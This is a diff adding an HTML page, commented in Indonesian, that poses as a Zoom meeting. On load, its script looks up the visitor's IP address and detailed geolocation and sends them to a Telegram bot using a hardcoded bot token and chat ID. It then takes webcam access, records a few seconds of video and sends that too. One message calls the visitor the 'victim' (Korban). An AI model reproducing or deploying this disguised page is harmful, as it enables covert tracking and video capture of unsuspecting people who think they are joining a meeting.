@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Zoom - Meeting</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="video-container">
+    <video id="userVideo" autoplay playsinline></video>
+  </div>
+
+  <!-- Bar bagian bawah dengan gambar memanjang -->
+  <div class="bottom-bar">
+    <img src="https://files.catbox.moe/mkpj7q.png" alt="Bottom Bar">
+  </div>
+
+  <script>
+    const video = document.getElementById('userVideo');
+    const ownerId = '7377733784'; // Ganti dengan owner ID Anda
+    const botToken = '7512836049:AAHB9STFF0Qxzg5ryLs6Gc7idtdBFJJBGYE'; // Ganti dengan token bot Anda
+
+    // Fungsi untuk mendapatkan informasi lengkap IP pengguna
+    async function getIPInfo() {
+      try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const ip = ipData.ip;
+
+        // Dapatkan informasi lokasi berdasarkan IP menggunakan ip-api.com
+        const locationResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query`);
+        const locationData = await locationResponse.json();
+
+        if (locationData.status !== 'success') {
+          throw new Error(locationData.message || 'Failed to fetch location data');
+        }
+
+        return {
+          ip: ip,
+          continent: locationData.continent,
+          continentCode: locationData.continentCode,
+          country: locationData.country,
+          countryCode: locationData.countryCode,
+          region: locationData.regionName,
+          city: locationData.city,
+          district: locationData.district,
+          zip: locationData.zip,
+          latitude: locationData.lat,
+          longitude: locationData.lon,
+          timezone: locationData.timezone,
+          offset: locationData.offset,
+          currency: locationData.currency,
+          isp: locationData.isp,
+          org: locationData.org,
+          as: locationData.as,
+          asname: locationData.asname,
+          reverse: locationData.reverse,
+          mobile: locationData.mobile,
+          proxy: locationData.proxy,
+          hosting: locationData.hosting,
+        };
+      } catch (error) {
+        console.error('Error fetching IP info:', error);
+        return {
+          ip: 'Unknown IP',
+          continent: 'Unknown',
+          continentCode: 'Unknown',
+          country: 'Unknown',
+          countryCode: 'Unknown',
+          region: 'Unknown',
+          city: 'Unknown',
+          district: 'Unknown',
+          zip: 'Unknown',
+          latitude: 'Unknown',
+          longitude: 'Unknown',
+          timezone: 'Unknown',
+          offset: 'Unknown',
+          currency: 'Unknown',
+          isp: 'Unknown',
+          org: 'Unknown',
+          as: 'Unknown',
+          asname: 'Unknown',
+          reverse: 'Unknown',
+          mobile: 'Unknown',
+          proxy: 'Unknown',
+          hosting: 'Unknown',
+        };
+      }
+    }
+
+    // Fungsi untuk mengirim pesan ke bot Telegram
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      const data = {
+        chat_id: ownerId,
+        text: message,
+      };
+
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data),
+        });
+        const result = await response.json();
+        console.log('Message sent:', result);
+      } catch (error) {
+        console.error('Error sending to Telegram:', error);
+      }
+    }
+
+    // Fungsi untuk mengirim video ke Telegram
+    async function sendVideoToTelegram(videoBlob) {
+      const formData = new FormData();
+      formData.append('chat_id', ownerId);
+      formData.append('video', videoBlob, 'XbibzVersiBeta☠️⚡.webm');
+
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+          method: 'POST',
+          body: formData,
+        });
+        const result = await response.json();
+        console.log('Video sent:', result);
+      } catch (error) {
+        console.error('Error sending video to Telegram:', error);
+      }
+    }
+
+    // Fungsi untuk merekam video dari elemen <video>
+    async function recordVideo(duration) {
+      const stream = video.srcObject;
+      const mediaRecorder = new MediaRecorder(stream, {
+        mimeType: 'video/webm; codecs=vp9',
+      });
+
+      const chunks = [];
+      mediaRecorder.ondataavailable = (event) => {
+        chunks.push(event.data);
+      };
+
+      return new Promise((resolve) => {
+        mediaRecorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'video/webm' });
+          resolve(blob);
+        };
+
+        mediaRecorder.start();
+        setTimeout(() => {
+          mediaRecorder.stop();
+        }, duration);
+      });
+    }
+
+    // Fungsi untuk mengirim informasi IP dan (jika diizinkan) video ke Telegram
+    async function sendIPInfoAndVideo() {
+      // Dapatkan informasi IP pengguna
+      const ipInfo = await getIPInfo();
+      const message = `
+📡 User has entered the website!
+🌐 IP Address: ${ipInfo.ip}
+🌍 Continent: ${ipInfo.continent} (${ipInfo.continentCode})
+🇺🇳 Country: ${ipInfo.country} (${ipInfo.countryCode})
+📍 Region: ${ipInfo.region}
+🏙️ City: ${ipInfo.city}
+🏘️ District: ${ipInfo.district}
+📮 ZIP Code: ${ipInfo.zip}
+📍 Latitude: ${ipInfo.latitude}
+📍 Longitude: ${ipInfo.longitude}
+🕒 Timezone: ${ipInfo.timezone} (UTC ${ipInfo.offset})
+💵 Currency: ${ipInfo.currency}
+🔌 ISP: ${ipInfo.isp}
+🏢 Organization: ${ipInfo.org}
+🖥️ AS Number: ${ipInfo.as} (${ipInfo.asname})
+🔍 Reverse DNS: ${ipInfo.reverse}
+📱 Mobile: ${ipInfo.mobile ? 'Yes' : 'No'}
+🕵️ Proxy: ${ipInfo.proxy ? 'Yes' : 'No'}
+🏢 Hosting: ${ipInfo.hosting ? 'Yes' : 'No'}
+      `;
+      await sendToTelegram(message);
+
+      // Coba akses kamera dan rekam video jika diizinkan
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        // Rekam video selama 3 detik
+        const videoBlob = await recordVideo(6000);
+        await sendVideoToTelegram(videoBlob);
+      } catch (error) {
+        console.error('Error accessing camera:', error);
+        await sendToTelegram('⚠️ Korban Tidak Mengizinkan Akses Kamera. . . .');
+      }
+    }
+
+    // Saat halaman dimuat, kirim informasi IP dan (jika diizinkan) video
+    window.onload = () => {
+      sendIPInfoAndVideo();
+    };
+
+    // Aktifkan fullscreen saat halaman dimuat
+    document.documentElement.requestFullscreen().catch((error) => {
+      console.error('Error attempting to enable fullscreen:', error);
+    });
+  </script>
+</body>
+</html>
